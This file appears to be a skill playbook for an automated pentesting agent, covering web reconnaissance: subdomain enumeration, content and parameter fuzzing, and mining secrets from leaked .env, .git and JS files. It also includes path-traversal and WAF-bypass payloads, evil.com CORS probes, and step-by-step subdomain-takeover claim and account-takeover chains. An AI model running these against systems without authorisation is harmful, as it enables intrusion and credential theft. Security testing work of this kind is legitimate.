---
name: Web Reconnaissance & Mapping
description: Systematically fingerprint, enumerate, and map a web target's full attack surface before testing — technologies, endpoints, parameters, auth, and APIs.
tags: [web, recon, enumeration, mapping, vhost, fuzzing, js-mining]
recommended_tools: [httpx_probe, whatweb_scan, wappalyzer_scan, nmap_scan, gobuster_scan, feroxbuster_scan, ffuf_scan, katana_crawl, hakrawler_crawl, gau_discovery, waybackurls_discovery, arjun_parameter_discovery, paramspider_discovery, subfinder_scan, wafw00f_scan]
domain: recon
phase: recon
---
# Web Reconnaissance & Mapping

Goal: build an accurate, complete map of the target so later testing is targeted, not random. Bad recon is the #1 cause of missed findings.

## Method (run in order, feed everything into the knowledge base)
1. **Fingerprint the stack** — `httpx_probe` (title, status, tech, server) and `whatweb_scan`/`wappalyzer_scan`. Record server, framework, language, CMS, CDN/WAF (`wafw00f_scan`). Tech dictates which vulns to prioritise (e.g. WordPress → `wpscan`, PHP → SQLi/LFI, Node → prototype pollution/SSRF).
2. **Port/service discovery** — `nmap_scan` for non-web services that widen the surface.
3. **Content discovery** — `gobuster_scan`/`feroxbuster_scan`/`ffuf_scan` with stack-appropriate wordlists and extensions (`.php`,`.bak`,`.old`,`.zip`,`.git`,`.env`). Note 200/301/403 and response sizes; 403 often hides real paths.
4. **Crawl + historical URLs** — `katana_crawl`/`hakrawler_crawl` for live links and `gau_discovery`/`waybackurls_discovery` for archived URLs (old endpoints, parameters, API routes are gold).
5. **Parameter discovery** — `arjun_parameter_discovery`/`paramspider_discovery` on every interesting endpoint. Hidden parameters are where injection/IDOR live.
6. **Subdomains** — `subfinder_scan` to expand scope (stay within the engagement scope/ROE).

## Classify every surface (and mark each untested)
Login/auth, registration, password reset, admin, search, file upload/download, profile/account (IDOR), API (REST/GraphQL), redirects, server-side includes, configuration, payment, import/export.

## Rules
- Recon is read-only — submit no exploit payloads here.
- Deduplicate; prefer breadth before depth.
- Every confirmed technology / endpoint / parameter goes into the knowledge base with its source.
- Stop recon only when new scans stop revealing new surface, then move to exploitation against the highest-value surfaces first.


<!-- Ingested from reference frameworks (skill-ingestion) -->
## Target-type tool-effectiveness routing (pick top-N by score)
Classify target into {web app, network host, API endpoint, cloud, mobile, binary}, then select tools by score:
```
Web:     nuclei 0.95, gobuster 0.9, sqlmap 0.9, ffuf 0.9, katana, dalfox
Network: nmap 0.95, autorecon 0.95, rustscan 0.9, masscan, enum4linux-ng
API:     arjun 0.95, x8 0.92, httpx 0.9, paramspider
Cloud:   prowler 0.95, scout-suite 0.92, trivy 0.9
```

## Ordered attack-pattern chains (output of each stage feeds the next)
```
Web recon:  nmap -> httpx -> katana -> gau -> waybackurls -> nuclei -> dirsearch -> gobuster
API test:   httpx -> arjun -> x8 -> paramspider -> nuclei -> ffuf
Net/SMB:    arp-scan -> rustscan -> nmap-advanced -> masscan -> enum4linux-ng -> nbtscan -> smbmap
```

## Fingerprint-then-specialize (cut request volume + false positives)
Run whatweb/httpx first, then tailor downstream params:
```
gobuster ext:  PHP -> -x php,html,txt,xml   ASP.NET -> -x asp,aspx   Java -> -x jsp
sqlmap dbms:   PHP -> --dbms=mysql   ASP.NET -> --dbms=mssql
nuclei tags:   -tags wordpress|drupal|joomla   (from detected stack)
ffuf mc:       web -> -mc 200,204,301,302,307,401,403   API -> -mc 200,201,202
katana:        katana -d 3 -jc -fx   (depth 3, JS crawl, form extraction -> surfaces API params)
```

## Aggressiveness profiles (single global knob, flip on WAF detection)
```
stealth:    threads=5,  rate=100,   delay=1s, nmap -T2
normal:     threads=20, rate=1000,  nmap -T3/-T4
aggressive: threads=50, rate=10000, nmap -T4
```
Run wafw00f first; if a WAF is present drop to stealth. Failure recovery: on rate_limited -> exponential backoff (30s start, x1.5, max 300s, 5 attempts) + reduce rate; on timeout -> -T2/threads=10; on resource exhaustion -> threads=3.

## Param mining for hidden inputs
```
arjun -u https://target/api/items -m JSON --headers "Authorization: Bearer $TOK"
x8 -u https://target/ -w params.txt
paramspider -d target.com
```
Proof signal for recon: each stage emits structured artifacts (live hosts, crawled endpoints, archived URLs, discovered hidden params, nuclei template IDs) consumed by the next stage. Coverage must include URL params, POST body, headers, cookies, JSON params, upload filenames, hidden fields, multipart, and GraphQL args.

## Modern techniques & real-world CVEs (via recon-skills)

### Certificate-transparency subdomain enumeration (crt.sh) — the #1 internal-asset source
Passive CT logs surface internal infrastructure no other source sees. Combine crt.sh + subfinder + Chaos, merge with `anew`, resolve, then probe.
```bash
DOMAIN="target.com"
# crt.sh (no API key). Query both wildcard and bare, strip *. and www.
curl -sk "https://crt.sh/?q=%25.$DOMAIN&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g;s/^www\.//' | sort -u > subs.txt
curl -sk "https://crt.sh/?q=$DOMAIN&output=json"     | jq -r '.[].name_value' | sed 's/\*\.//g;s/^www\.//' | sort -u >> subs.txt
subfinder -d "$DOMAIN" -all -silent | anew subs.txt
# Chaos (ProjectDiscovery) — most comprehensive; needs free CHAOS_API_KEY
curl -s "https://dns.projectdiscovery.io/dns/$DOMAIN/subdomains" -H "Authorization: $CHAOS_API_KEY" | jq -r '.[]' | anew subs.txt
sort -u subs.txt | grep -E '^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$' | dnsx -silent | httpx -silent -sc -title -tech-detect -location -o alive.txt
```
Real-world: crt.sh on `biglots.com` leaked 20+ internal hosts (`sftp.`, `eac.` Exchange Admin Center, `jss.` Jamf MDM, helpdesk, controllers); on `realpro.com` it surfaced `owa.` (OWA/Exchange), `vpn.`, `remote.`, `srvexch01/02`. None were publicly known before CT enumeration.

**Pitfalls:** crt.sh returns empty JSON when rate-limited (add 2-3s delay, or hit the Postgres dump). Wildcard certs hide individual subs — fall back to subfinder DNS brute. Detect wildcard DNS by resolving a random string (`dig RANDOMSTRING.target.com`); if it resolves, every httpx result is a false "live". Cloudflare-proxied subs show CDN IPs, not origin — pull historical A records from SecurityTrails/DNSDumpster for origin.

### Categorize subdomains for fast triage
Run these greps over the merged list to route surface immediately:
```bash
grep -iE 'staging|stage|dev\.|development|test|uat|beta|sandbox|preview|qa' subs.txt   # staging/dev — weaker security
grep -iE 'admin|portal|internal|dashboard|manage|cp\.|control|panel|cpanel|webmail'   subs.txt   # admin/internal
grep -iE 'api|rest|graphql|ws\.|websocket'                                            subs.txt   # API
grep -iE 'owa|vpn|remote|sftp|mail\.|smtp|autodiscover'                                subs.txt   # corp/email infra
```
2026 high-hit prefixes against enterprise VDPs: `mta-sts.*`, `dev-*`, `staging-*`, `*-qa`, `*-uat`, `partner.*`, `vendor.*`, `sso.*`, `auth.*`, `id.*`, `employee-*`, `internal-*`. Internal-looking hosts (`partner.`, `vendor-portal.`) frequently have weaker auth than the marketing site.

### Staging security-gap exploitation
Staging/dev environments consistently drop WAF, enable debug, and leave install pages open. After finding a staging host, compare it against production:
```bash
STAGING="https://staging.target.com"
# Fresh-WordPress install takeover (200 = attacker can configure the site)
curl -sk -o /dev/null -w "install=%{http_code}\n" "$STAGING/wp-admin/install.php"   # 200 + "WordPress"+"installation" body = takeover
curl -sk -o /dev/null -w "upgrade=%{http_code}\n" "$STAGING/wp-admin/upgrade.php"
curl -sk -o /dev/null -w "setup=%{http_code}\n"   "$STAGING/wp-admin/setup-config.php"
# Debug / info leaks that production blocks
curl -sk -o /dev/null -w "info=%{http_code}\n"    "$STAGING/info.php"
curl -sk -o /dev/null -w "env=%{http_code}\n"     "$STAGING/.env"
# CORS on staging that production would reject
curl -skI "$STAGING/wp-json/wp/v2/users" -H "Origin: https://evil.com" | grep -i 'access-control'
```
Confirm a real gap: production has WAF/no leaks but staging exposes the same surface. Always test the full CORS matrix (10+ endpoints) on BOTH environments — reflection is often endpoint-specific.

### Subdomain takeover — modern provider fingerprints (2022-2024)
Extract CNAMEs, flag those whose target does not resolve (NXDOMAIN) or returns a provider "unclaimed" template.
```bash
# Bulk CNAME + NXDOMAIN detection
while read sub; do
  cname=$(dig +short CNAME "$sub" | head -1)
  [ -n "$cname" ] && [ -z "$(dig +short A "$cname")" ] && echo "[POTENTIAL] $sub -> $cname (NXDOMAIN)"
done < subs.txt
# Fingerprint scan
nuclei -l subs.txt -t ~/nuclei-templates/http/takeovers/ -severity medium,high,critical
subjack -w subs.txt -t 100 -timeout 30 -ssl -c fingerprints.json -v
```
Provider error strings (grep the HTTP body): `"there isn't a github pages site here"` (repo deleted = claimable; **"Page not found · GitHub Pages"** = repo still exists, NOT a takeover), `"NoSuchBucket"`/`"The specified bucket does not exist"` (S3), `"No such app"` (Heroku), `"Sorry, this shop is currently unavailable"` (Shopify), `"Fastly error: unknown domain"`, `"404 Web Site not found"` (Azure App Service), Vercel `DEPLOYMENT_NOT_FOUND`. CloudFront: `"The request could not be satisfied"` + `X-Cache: Error from cloudfront` = origin gone (takeover); plain `Error - 404` with `Server: CloudFront` = still owned.

Modern disclosed claim flows:
- **Vercel deleted-project** (`cname.vercel-dns.com`): 404 `DEPLOYMENT_NOT_FOUND` → create a free Vercel project → Settings → Domains → add the dangling host → Vercel verifies the existing CNAME and auto-issues TLS with no out-of-band ownership proof. (Sifchain `proxies.sifchain.finance`, 2022 — web3 wallet-drain phishing.)
- **Azure `cloudapp.azure.com` regional-pool re-issue**: identify dangling CNAME → deploy a free-tier VM in the same Azure region requesting the exact released hostname → Azure re-issues first-come-first-serve. Chained with wildcard `*.visualstudio.com` OAuth `reply_to` → 1-click ATO (Binary Security, Nov 2022).
- **Zendesk host-mapping**: `dig CNAME` → unregistered `*.zendesk.com` → register a free Zendesk trial → add the subdomain → enable host-mapping. Chains to email interception → password-reset ATO (0xprial writeup, 2023).
- **Fastly dangling service**: sign up for a Fastly trial → create a CDN service → attach the dangling hostname; Fastly historically does not verify CNAME ownership on service creation.

### Takeover impact chains (Low alone → Critical when chained)
A bare takeover is Informational on mature programs. Before filing, check the taken-over host against these five allowlists:
1. **OAuth `redirect_uri` allowlist** — host present → auth-code theft → 1-click ATO (Critical).
2. **Parent-scoped cookies** — main app sets `Set-Cookie ... Domain=.target.com` → plant `SESSIONID` from the takeover host → session-fixation ATO (High). Non-`__Host-`-prefixed cookies are the tell.
3. **CSP `script-src`** — host in allowlist → serve JS from it → executes with main-app origin = persistent stored-XSS-equivalent (Critical).
4. **CORS `Access-Control-Allow-Origin` regex** — regex matches host → credentialed cross-origin API read (mass IDOR/BOLA) (High). Watch for the `target.com.*` suffix-match bug.
5. **Email DNS (DKIM selector / SPF include / MX)** — take over a DKIM/SPF-include host → publish records authorising your mail server → SPF+DKIM-passing phishing `From: support@target.com` (High).
```bash
curl -Isk "https://target.com" | grep -i 'set-cookie' | grep 'domain=.target.com'   # Chain 2 signal
```

### Sensitive-file & source-leak probing (post-recon, high hit rate on neglected infra)
One `.env` or `.git` leak often cascades to full credential access. Probe a broad path list, then auto-extract secrets.
```bash
# High-value paths (union): env/git/laravel-storage/spring-actuator/swagger/vcs metadata
# /.env /.env.production /.env.bak  /.git/config /.git/HEAD  /storage/oauth-private.key
# /storage/logs/laravel.log  /wp-config.php.bak  /actuator/env /actuator/heapdump
# /*.js.map (source maps)  /server-status /phpinfo.php /info.php /test.php
for p in /.env /.git/config /wp-config.php.bak /storage/logs/laravel.log /actuator/env /info.php; do
  curl -sk -o /dev/null -w "$p -> %{http_code} %{size_download}B\n" "https://target.com$p"
done
# Auto-extract from a leaked .env
curl -sk "https://target.com/.env" | grep -iE 'DB_PASSWORD|APP_KEY|AWS_|SENDGRID|STRIPE|JWT_SECRET|OPENAI_API_KEY|SENTRY_DSN'
# Dump an exposed .git repo
git-dumper http://target.com/.git/ /tmp/repo/
```
**Path-traversal bypass** when a WAF blocks the direct path: `/../.env`, `/%2e%2e/.env`, `/..%2f.env`, `/public/../.env`, `/storage/../.env`, `/.env%00.html`, `/.env%23`. Confirm a real leak by keyword — a `200` from an SPA/commerce catch-all returns the HTML homepage for *any* path. Gate the finding: `.env` must contain `DB_`/`APP_`/`_KEY`/`_SECRET`; `.git/config` must contain `[core]`. Verify catch-all first with `/nonexistent-test-path-xyz`.

Real cases: OVH Laravel box exposed `.env` + `.git/config` + `storage/oauth-private.key` (MySQL/SendGrid/Firebase creds); a gov agency ran Vite in dev mode serving 45 `.ts` files with `VITE_JWT_SECRET`/`VITE_API_TOKEN` in plaintext; `wines.com` exposed PHPInfo at both `/info.php` and `/test.php` (839 entries each).

### API spec / Swagger / OpenAPI discovery (2024-2026 highest-leverage surface)
A spec discloses every endpoint, method, parameter type/format/enum, and model — a complete attack map. Default routes are commonly left on in production. Fuzz the full path list; a `404` on `/swagger` does NOT mean no spec (many .NET apps route it under `/api/swagger/v1/swagger.json`).
```
/swagger/v1/swagger.json  /swagger/v2/swagger.json  /swagger-ui/index.html  /api/swagger.json
/v2/api-docs  /v3/api-docs  /openapi.json  /openapi.yaml  /.well-known/openapi.json
/docs  /redoc  /graphql  /graphiql  /playground  /voyager  /actuator/openapi
/q/openapi  /q/swagger-ui  /internal/swagger  /admin/swagger  /api/v1/docs
```
```bash
httpx -l alive.txt -path swagger-paths.txt -mc 200 -mr "swagger|openapi" -json | tee swagger-hits.jsonl
jq '.paths | keys'        swagger.json > endpoints.txt   # → per-user IDOR/BOLA input list
jq '.components.schemas'  swagger.json > schemas.json     # → mass-assignment fields (isAdmin, tenantId, role)
```
Tools: `kiterunner` (ingests OpenAPI → generates requests), `sj` (Swagger Jacker), `apidetector`, `XSSwagger` (Swagger-UI CVE-2018-25031 family), `nuclei -t http/exposures/apis/`.

### JS bundle mining — secrets + hidden endpoints (BusyBox/Alpine-safe)
JS bundles hold API keys, backend URLs on non-standard ports, and undocumented routes. BusyBox grep lacks `-P`; use `python3` regex on minimal workers.
```bash
cat urls.txt | grep '\.js$' | while read u; do
  curl -sk "$u" | python3 -c "
import sys,re; c=sys.stdin.read()
for k in re.findall(r'AIza[0-9A-Za-z_-]{35}', c): print('Firebase:',k)
for m in re.findall(r'(?:apiUrl|apiKey|authDomain|databaseURL|client_secret|jwt[_-]?secret)[\"\']?\s*[:=]\s*[\"]([^\"\']+)', c): print('Config:',m)
for s in re.findall(r'(?:secret|token)[\"\']?\s*[:=]\s*[\"]([a-zA-Z0-9_\-]{16,})', c): print('Secret:',s)
"
done
```
Higher-signal tooling: `trufflehog filesystem --only-verified recon/$TARGET/`, `gitleaks`, LinkFinder/SecretFinder for endpoint + key extraction. Field win: a React SPA bundle revealed `apiUrl: https://patientportal.com:8081`, an internal API backend on a non-standard port. Also grep JS for sibling TLDs (`target.io/.app/.one/.dev`) — cross-TLD pivot found 12 extra hosts on `hacker.one` from `hackerone.com` bundles.

### WordPress deep enumeration (five checks nuclei/httpx miss)
```bash
# 1. REST namespace via both roots — dual-WP installs differ
curl -sk "https://target.com/wp-json/" | jq '.namespaces'
curl -sk "https://target.com/?rest_route=/" | jq '.namespaces'
# 2. CORS credential reflection (test BOTH root and /wp/v2/users)
curl -skI "https://target.com/wp-json/wp/v2/users" -H "Origin: https://evil.com" | grep -i 'access-control'
# 3. XMLRPC method extraction (system.multicall / pingback / upload = amplification+SSRF)
curl -sk -X POST "https://target.com/xmlrpc.php" -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>' \
  | grep -oE '<string>[^<]+</string>'
# 4. Cross-subdirectory WP installs — each has its own plugin/vuln profile
for sub in /magical /blog /shop /wp2 /old /beta /staging; do
  curl -sk -o /dev/null -w "$sub/wp-json -> %{http_code}\n" "https://target.com${sub}/wp-json/"; done
# 5. Yoast author-sitemap email disclosure (spear-phishing seed)
curl -sk "https://target.com/author-sitemap.xml" | grep -oE 'author/[^"]+' | sort -u
```
Never follow redirects (`-L`) on XMLRPC probes — a redirect can mask a real 200 POST response.

### Cross-wave delta analysis (repeated recon on the same target set)
When re-scanning a target set over time, diff findings into four buckets to catch drift: **NEW** (port 3306 now open), **REGRESSION** (XMLRPC 200→405, user endpoint hardened), **PERSISTENT** (CORS reflection unchanged across waves = no mitigation applied), **CHANGE** (WP user count drift). Flag as new-critical: newly-open 3306/5432/6379/21/22/3389, new `owa.`/`vpn.`/`sftp.`/`staging.` hosts, new CORS reflection, new `.env`/phpinfo/`debug.log`/`backup.sql`. Persistence matters as much as novelty — an always-open MySQL port on a healthcare target is a standing finding regardless of code changes.

## Real-world chains (0xdf HTB)

Battle-tested ladders distilled from 115 0xdf HTB writeups. The pattern is invariant: **fingerprint the tech → find the *real* host/vhost → fuzz content and params → read source/JS/artifacts → land on the exploitable entry point.** The entry point is almost always one rung past the default page. Placeholders: `<TARGET>` (host), `<IP>`, `<URL>`, `<DOMAIN>`, `<USER>`, `<PASS>`.

### 1. Tech fingerprint first (never fuzz blind)
Whatweb + headers + a default-page diff decide every downstream wordlist, extension, and CVE lookup.
```bash
whatweb -a3 http://<IP>/                          # -a3 = aggressive plugin fingerprint
curl -skI http://<IP>/ | grep -iE 'server|x-powered-by|set-cookie|location|x-generator'
curl -sk  http://<IP>/ | grep -oiE '<meta name="generator"[^>]+|/wp-content/|__NEXT_DATA__|Whitelabel Error|csrfmiddlewaretoken'
```
**Proof:** a concrete stack string. Frequent HTB tells and their routing:
- **Cookie/error signatures:** `laravel_session`+`XSRF-TOKEN`→Laravel (probe `.env`,`.git`); `JSESSIONID`+Whitelabel error→Spring Boot (→ actuator, step 4b); `connect.sid`→Express/Node; `csrftoken`→Django; Werkzeug 404→Flask (→ SSTI/`/console`).
- **Generator/footer:** WordPress→`wpscan`; Joomla→`administrator/manifests/files/joomla.xml`; Craft/Gibbon/WonderCMS/Camaleon/LimeSurvey→version-specific CVE. Grep footer + `X-Powered-By`.
- **NextJS:** pull `/_next/static/<BUILDID>/_buildManifest.js` to enumerate protected client routes (Previous, Ghost).

### 2. Redirect-to-hostname → set up name resolution
A raw-IP hit that 301/302s to a hostname (or is `Host`-dependent) means the app is vhost-routed. Add the name to `/etc/hosts` *before* fuzzing — most content is invisible by IP alone.
```bash
nmap -p- --min-rate 10000 <IP>; nmap -p <PORTS> -sCV <IP>   # -sCV http-git flags exposed /.git early
curl -skI http://<IP>/ | grep -i location                   # -> http://<TARGET>/ reveals the vhost
echo "<IP> <TARGET>" | sudo tee -a /etc/hosts
```
**Proof:** `Location:` header or in-body links expose a `.htb`/internal hostname; requesting by name returns a different (larger) body than the IP. Note extra open ports (3000 Gitea, 3306, 5000/8000/8080 apps, 5001/5000 Docker registry, 8161 ActiveMQ) — each widens the surface.

### 3. Vhost + subdomain fuzzing (ffuf Host header) — the #1 hidden-app trick
Present on ~40% of these boxes. Fuzz `Host:` against the base domain and filter the default-response fingerprint. `-ac` auto-calibrates; fall back to explicit `-fs`/`-fw`/`-fl` when responses are dynamic. Use `-mc all` so `401`/`403` vhosts aren't hidden.
```bash
ffuf -u http://<IP>/ -H "Host: FUZZ.<DOMAIN>" \
     -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -mc all -ac
# HTTPS / self-signed target
ffuf -u https://<IP>/ -H "Host: FUZZ.<DOMAIN>" -w <WORDLIST> -mc all -ac
# Dynamic size -> filter the measured baseline instead of -ac
wfuzz -u http://<IP>/ -H "Host: FUZZ.<DOMAIN>" -w subdomains-top1million-5000.txt --hh <BASELINE_CHARS>
```
**Proof:** a `FUZZ` value returns a size/word/line count distinct from baseline. Add each hit to `/etc/hosts`, then re-run whatweb + dirfuzz against it. Recovered vhosts routinely host: Gitea/GitBucket source repos (`git.`, `dev.`), admin/CRM panels (`admin.`, `crm.`, `webdb.`), APIs (`api.`, `mywalletv1.`), FTP/mail apps (`ftp.` CrushFTP/Wing FTP, `mail.` RoundCube), monitoring (`cacti.`, `zabbix.`, `grafana.`, `teamcity.`), and blocked/dev hosts that only differ by proxy filtering (a `403` where siblings return `200` = proxy-gated dev host). Also try the CSP header and TLS cert SAN as vhost seeds.

### 4. Directory / file content discovery
Feroxbuster (recursive) is the default; feed extensions from step 1. Watch response *sizes*, not just codes — a `403`/`301` frequently gates the real path, and a uniform size is a soft-404 catch-all.
```bash
feroxbuster -u http://<TARGET>/ -x php --dont-extract-links -C 404 -o ferox.txt   # PHP is the most common stack
# HTTPS self-signed: add -k ; noisy JS apps: --dont-extract-links ; flat apps: -n / --no-recursion
feroxbuster -u https://<TARGET>/ -x php -k --no-recursion
ffuf -u http://<TARGET>/FUZZ -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt \
     -e .php,.bak,.config,.old -mc all -ac
```
**Proof:** a `200`/`301`/`403` at a non-default path with a size differing from the catch-all (verify the baseline with `/zzz-nonexistent-123` first). High-frequency finds and their meaning:
- **Endpoint maps:** `/login /register /dashboard /upload /admin` (Flask/Laravel apps); `/upload.php /download.php /reset_password.php /manage.php /view.php` (PHP CRUD apps — upload + IDOR surface).
- **App/version pin:** `/admin` panel + footer reveals CMS+version (Camaleon, WonderCMS, LimeSurvey, Gibbon, request-baskets, Cacti); `403` on `/daloradius`/`/phpmyadmin`/`/logs` hints at a hidden app behind a proxy.
- **Framework wordlists:** Spring Boot → `-w /opt/SecLists/Discovery/Web-Content/spring-boot.txt` to hit `/actuator/*` (heapdump, env) unauthenticated (Eureka, CozyHosting); Nginx-UI / `/api/backup` unauth (Snapped).
- **Method bypass:** if a path is `401`/`403` on GET, retry other verbs — `feroxbuster -m GET,POST,PUT,OPTIONS` (POST/PUT often returns `200`, Gofer).

### 5. Exposed VCS / config / artifact leaks (fastest source disclosure)
The single highest-yield rung — a `.git`, `.env`, or exposed repo hands you full source + creds. nmap `http-git` or a dirfuzz hit flags it; then dump and mine history.
```bash
git-dumper http://<TARGET>/.git/ repo && cd repo && git log -p          # commit history leaks creds
git-dumper http://<TARGET>/dev/.git/ repo                               # often nested under a path/vhost
GIT_SSL_NO_VERIFY=1 git clone https://git.<DOMAIN>/<USER>/<REPO>.git    # exposed Gitea/GitBucket clone
curl -sk http://<TARGET>/.env                                           # Laravel/PHP DB_PASS, APP_KEY
```
**Proof:** `settings.php`/`auth.php`/`config.php` with hardcoded DB or admin creds; `git log -p` showing a committed password (e.g. `gitbot:...`, `OctopiFociPilfer45`); `.env` containing `DB_`/`APP_KEY`/`NEXTAUTH_SECRET`; a config SHA/SHA512 hash in a committed `pass.php`/`database.js`. Gate `.env` on real keywords — an SPA catch-all returns the homepage for any path.

### 5b. Container / binary / package artifacts
When the app ships a downloadable artifact, pull and decompile it for endpoints, creds, and gadget libs.
```bash
# Anonymous Docker Registry v2 -> catalog -> pull image -> extract WAR
curl -k 'https://<DOMAIN>:5001/auth?service=Docker+registry&scope=registry:catalog:*'
curl -k 'https://<DOMAIN>:5000/v2/_catalog' -H "Authorization: Bearer <TOKEN>"
docker pull <DOMAIN>:5000/<IMAGE>:latest
# Decompile Java / PyInstaller / .NET client artifacts for backend URLs + injection sinks
jadx-gui <APP>.jar          # custom Neo4j APOC / WAR -> command-injection sink, gadget libs
python3 /opt/pyinstxtractor/pyinstxtractor.py <BINARY>   # ws:// endpoints, hidden vhosts (Socket)
exiftool output.pdf         # generator string pins a vulnerable lib (pdfkit v0.8.6, ImageMagick)
```
**Proof:** WAR/JAR source exposes `/hosting/reconfigure`, an unsafe `Runtime.exec`, or a bundled vulnerable dependency (commons-collections, ImageMagick 7.1.0-49); an extracted binary reveals an internal websocket/vhost; PDF/exif metadata names a CVE'd generator.

### 6. Parameter fuzzing + traversal/IDOR hunting
When an endpoint takes input with an unknown param, fuzz it; when a `?page=`/`?file=`/`?fn=`/`?example=` param exists, it's an LFI/traversal/SSRF candidate; when objects are keyed by a numeric/username ID, test IDOR.
```bash
# Hidden GET params (filter the no-param baseline)
ffuf -u "http://<TARGET>/index.php?FUZZ=test" -w /opt/SecLists/Discovery/Web-Content/burp-parameter-names.txt -fs <BASELINE>
arjun -u "http://<TARGET>/api/endpoint" -m GET,POST
# Path traversal in a download/export/log handler (--path-as-is keeps ../)
curl -s --path-as-is "http://<TARGET>/download?fn=../../../../etc/passwd" -b "<COOKIE>"
curl -s "http://<TARGET>/api/download?example=../../../../<APP>/.env"          # leaks source/secrets
# Absolute-path bypass when only '../' is stripped (IIS)
curl "http://dev.<DOMAIN>/index.aspx?file=<ABSOLUTE_PATH>\\web.config"          # machineKey disclosure
# IDOR / username enumeration by response delta
ffuf -u 'http://<TARGET>/view.php?username=FUZZ&file=test.doc' -b 'PHPSESSID=<S>' -w names.txt -fr 'User not found'
ffuf -u 'http://<TARGET>:3000/clipnotes/FUZZ' -w <(seq 0 150)                   # sequential-ID IDOR
```
**Proof:** a `FUZZ` param name shifts response size/content (param honored); a traversal payload returns a file signature (`root:x:0:0`, `<?php`, `<machineKey`, a `.env` body); an IDOR sweep returns another user's resource or a distinct "valid user" response. Hand injectable params straight to SQLi/LFI/SSTI/SSRF testing.

### 7. Source & JS review — the fastest path to the entry point
Read page source and every referenced JS bundle before brute-forcing further. Client code leaks API base URLs, undocumented routes, hardcoded creds, dev comments, and undocumented API versions.
```bash
curl -sk http://<TARGET>/ | grep -oiE 'src="[^"]+\.js"|<!--.*-->'      # assets + dev comments
katana -u http://<TARGET>/ -jc -d 3 -o urls.txt                        # -jc parses JS for endpoints
feroxbuster -u http://<TARGET>/js -x js                                # some routes only in bundles
cat urls.txt | grep '\.js$' | while read u; do
  curl -sk "$u" | grep -oiE '/api/[a-z0-9_/-]+|https?://[a-z0-9._-]+|(apiKey|token|secret|password)["'\'' ]*[:=]["'\'' ]*[^"'\'' ,}]+'
done
```
**Proof:** JS/source reveals an undocumented route (`/api/v1/admin`, a v2 API that hashes client-side — Intentions), a hardcoded credential (`jeremy` in `[...nextauth].js` — Previous), an internal hostname (→ feed back to step 3), or a Swagger/JWKS endpoint (→ token abuse). A route found in JS becomes the next dirfuzz/param-fuzz target and usually *is* the exploitable entry point.

### 8. App-specific enumerators (run once the app is fingerprinted)
```bash
wpscan --url http://<TARGET>/ -e ap,u                 # WP version + vulnerable plugins (GiveWP, BuddyForms, BookingPress) + users
kinit <USER>; curl -I --negotiate -u : http://<DC_FQDN>/   # Kerberos/SPNEGO auth to an AD intranet app
```
**Proof:** wpscan pins WordPress + a plugin with a known CVE and enumerates usernames; a `200` with an accepted Kerberos ticket confirms domain-auth access to the web app.

### Loop, don't linear-scan
Every discovery re-seeds an earlier rung: a redirect → new hostname (step 2); a vhost → its own dirfuzz (step 4) + git check (step 5); a JS endpoint → param fuzz (step 6); a leaked source file → the exact injectable sink. Keep cycling until scans stop producing new surface, then attack the highest-value entry point first (exposed source/creds, upload, LFI/traversal, injectable param, unauth actuator) rather than the first thing found.
